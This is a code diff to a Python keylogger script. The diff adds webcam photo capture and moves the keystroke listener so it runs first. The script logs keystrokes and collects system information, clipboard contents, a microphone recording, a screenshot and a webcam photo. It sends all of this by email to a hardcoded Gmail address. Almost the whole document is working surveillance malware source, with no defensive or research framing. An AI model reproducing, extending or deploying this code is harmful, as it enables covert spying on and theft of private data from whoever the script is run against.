@@ -4,6 +4,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email.mime.image import MIMEImage
 from email import encoders
+import cv2
 import smtplib
 
 #Modules for computer information collection
@@ -17,6 +18,7 @@ import subprocess
 #Microphone modules
 from scipy.io.wavfile import write
 import sounddevice as sd
+import wavio as wv
 
 #Screenshot image grab
 from PIL import ImageGrab
@@ -38,6 +40,7 @@ system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
+photo_information = "photo.png"
 
 #Default email values
 email_address =  "keylogger4214389@gmail.com"
@@ -50,7 +53,9 @@ time_iteration = 30
 datenow = date.today()
 timenow = datetime.now().strftime("%H:%M:%S")
 currentTime = time.time()
-stoppingTime = time.time() + time_iteration
+
+#Default camera values
+cam = cv2.VideoCapture(0)
 
 #Encryption
 key = "aK9Aamh-txCxirHhCLEZ-phPxpQRUTEXhBHigOeF30Q="
@@ -62,6 +67,38 @@ clipboard_information_encrypted = "ecrypted_clipboard.txt"
 file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
 extend = "/"
 file_merge = file_path + extend
+
+#Logger Code
+keys = []
+count = 0
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(file_merge + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    elapsed_time = time.time() - currentTime
+    if elapsed_time >= time_iteration: 
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
 #The function that sends an email containing a keylog. 
 def send_email(toaddress):
@@ -77,10 +114,10 @@ def send_email(toaddress):
     body = "Log File with keylog, system information, clipboard contents, microphone recording, and screenshot. \nInformation logged at " + str(timenow) + " on " + str(datenow)
     msg.attach(MIMEText(body, 'plain'))
 
-    filenames = [ keys_information, system_information, clipboard_information, audio_information, screenshot_information ]
-    attachments = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information, file_merge + audio_information, file_merge + screenshot_information]
+    filenames = [ keys_information, system_information, clipboard_information, audio_information, screenshot_information, photo_information]
+    attachments = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information, file_merge + audio_information, file_merge + screenshot_information, file_merge + photo_information]
 
-    for x in range(5):
+    for x in range(6):
         filename = filenames[x]
         attachment = open(attachments[x], 'rb')
         if filename == "screenshot_information":
@@ -114,6 +151,7 @@ def computer_information():
         
         f.write("Private IP Address: " + IPAddress + '\n')
         f.write("Hostname: " + hostname + '\n')
+        f.write("OS: " + str(platform.mac_ver()) + '\n')
         f.write("Machine: " + platform.machine() + '\n')
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
         f.write("Processor: " + (platform.processor()) + '\n')
@@ -140,7 +178,7 @@ def microphone():
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels = 1)
     sd.wait()
 
-    write(file_path + extend + audio_information, fs, myrecording)
+    write(file_merge + audio_information, fs, myrecording)
 
 # microphone()
 
@@ -151,52 +189,46 @@ def screenshot():
 
 # screenshot()
 
+def photo():
+    result, img = cam.read()
+    if not result:
+        print("Image Capture Failed")
+    else :
+        cv2.imwrite(photo_information, img)
+    cam.release()
+
+#photo()
+
 def logger():
     computer_information()
     copy_clipboard()
     microphone()
     screenshot()
-
+    photo()
     send_email(toaddress)
-
-# logger()
     
-keys = []
-count = 0
-def on_press(key):
-    global keys, count
-    keys.append(key)
-    count += 1
-
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
-
-def write_file(keys):
-    with open(file_merge + keys_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
-
-def on_release(key):
-    elapsed_time = time.time() - currentTime
-    if elapsed_time >= time_iteration: 
-        return False
-    # if key == Key.esc:
-    #     return False
-
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
-
 logger()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
 # encrypted_file_names = [file_merge + system_information_encrypted, file_merge + clipboard_information_encrypted, file_merge + keys_information_encrypted]
